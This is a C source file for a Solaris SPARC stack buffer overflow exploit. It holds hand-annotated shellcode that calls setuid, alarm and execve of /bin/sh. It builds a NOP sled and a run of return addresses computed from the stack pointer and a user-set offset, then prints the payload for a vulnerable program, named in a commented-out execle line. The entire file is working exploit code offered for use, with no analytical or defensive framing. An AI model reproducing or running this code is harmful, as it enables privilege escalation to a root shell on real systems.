/* Solaris SPARC exploit, thx cheez */

#define BUFLEN 1111
#define NOPLEN 832
#define ADDRLEN 83

#define OFFSET -200             /* default offset */
#define ALIGNMENT 0             /* default alignment */

#define NOP 0x801bc00f          /* xor %o7,%o7,%g0 */

#include <stdio.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

char shell[] =
  /* setuid:                                           [2000]*/
  /*  0 */ "\x90\x1b\xc0\x0f"  /* xor %o7,%o7,%o0      [2000]*/
  /*  4 */ "\x82\x10\x20\x17"  /* mov 23,%g1           [2000]*/
  /*  8 */ "\x91\xd0\x20\x08"  /* ta 8                 [2000]*/
  /* alarm:                                            [2000]*/
  /* 12 */ "\x90\x1b\xc0\x0f"  /* xor %o7,%o7,%o0      [2000]*/
  /* 16 */ "\x82\x10\x20\x1b"  /* mov 27,%g1           [2000]*/
  /* 20 */ "\x91\xd0\x20\x08"  /* ta 8                 [2000]*/
  /* execve:                                           [2000]*/
  /* 24 */ "\x2d\x0b\xd8\x9a"  /* sethi %hi(0x2f62696e),%l6  */
  /* 28 */ "\xac\x15\xa1\x6e"  /* or %l6,%lo(0x2f62696e),%l6 */
  /* 32 */ "\x2f\x0b\xdc\xda"  /* sethi %hi(0x2f736800),%l7  */
  /* 36 */ "\x90\x0b\x80\x0e"  /* and %sp,%sp,%o0      [2000]*/
  /* 40 */ "\x92\x03\xa0\x08"  /* add %sp,8,%o1        [2000]*/
  /* 44 */ "\x94\x1b\xc0\x0f"  /* xor %o7,%o7,%o2      [2000]*/
  /* 48 */ "\x9c\x03\xa0\x10"  /* add %sp,16,%sp       [2000]*/
  /* 52 */ "\xec\x3b\xbf\xf0"  /* std %l6,[%sp-16]     [2000]*/
  /* 56 */ "\xd0\x23\xbf\xf8"  /* st %o0,[%sp-8]       [2000]*/
  /* 60 */ "\xc0\x23\xbf\xfc"  /* st %g0,[%sp-4]       [2000]*/
  /* 64 */ "\x82\x10\x20\x3b"  /* mov 59,%g1           [2000]*/
  /* 68 */ "\x91\xd0\x20\x08"; /* ta 8                 [2000]*/

extern char *optarg;

unsigned long int
get_sp()
{
  __asm__("or %sp,%sp,%i0");
}

int
main(int argc, char *argv[])
{
  unsigned long int sp, addr;
  int c, i, offset, alignment;
  char *program, *hostname, buf[BUFLEN+1], *cp;

  program = argv[0];
  offset = OFFSET;
  alignment = ALIGNMENT;

  while ((c = getopt(argc, argv, "h:o:a:")) != EOF)
    {
      switch (c)
        {
        case 'o':
          offset = (int) strtol(optarg, NULL, 0);
          break;
        case 'a':
          alignment = (int) strtol(optarg, NULL, 0);
          break;
        default:
          fprintf(stderr, "usage: %s [-o offset] "
                  "[-a alignment]\n", program);
          exit(1);
          break;
        }
    }
  memset(buf, '\xff', BUFLEN);
  for (i = 0, cp = buf + alignment; i < NOPLEN / 4; i++)
    {
      *cp++ = (NOP >> 24) & 0xff;
      *cp++ = (NOP >> 16) & 0xff;
      *cp++ = (NOP >>  8) & 0xff;
      *cp++ = (NOP >>  0) & 0xff;
    }
  memcpy(cp, shell, strlen(shell));
  sp = get_sp();
  addr = sp + offset;
  addr &= 0xfffffff8;
  for (i = 0, cp = buf + BUFLEN - ADDRLEN; i < ADDRLEN / 4; i++)
    {
      *cp++ = (addr >> 24) & 0xff;
      *cp++ = (addr >> 16) & 0xff;
      *cp++ = (addr >>  8) & 0xff;
      *cp++ = (addr >>  0) & 0xff;
    }
  buf[BUFLEN] = '\0';
  fprintf(stderr, "%%sp 0x%08lx offset %d --> return address 0x%08lx [%d]\n",
          sp, offset, addr, alignment);
  printf("%s",buf);
  //execle("./vulnerable","vulnerable", buf,  NULL, NULL);
  exit(1);
}
